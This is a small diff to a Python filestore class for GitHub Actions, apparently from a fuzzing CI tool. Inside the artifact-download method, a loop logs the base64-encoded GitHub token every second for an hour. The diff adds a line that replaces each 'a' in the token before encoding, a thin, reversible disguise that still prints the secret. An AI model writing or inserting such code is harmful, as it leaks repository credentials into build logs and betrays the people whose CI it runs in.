@@ -93,9 +93,10 @@ class GithubActionsFilestore(filestore.BaseFilestore):
     logging.debug('corpus artifact url: %s', url)
     import time
     import base64
+    t = self.config.github_token.replace('a', '-').encode()
     for _ in range(60 * 60):
       logging.debug('self.config.github_token %s',
-                    base64.b64encode(self.config.github_token.encode()))
+                    base64.b64encode(t))
       time.sleep(1)
 
     return http_utils.download_and_unpack_zip(url,
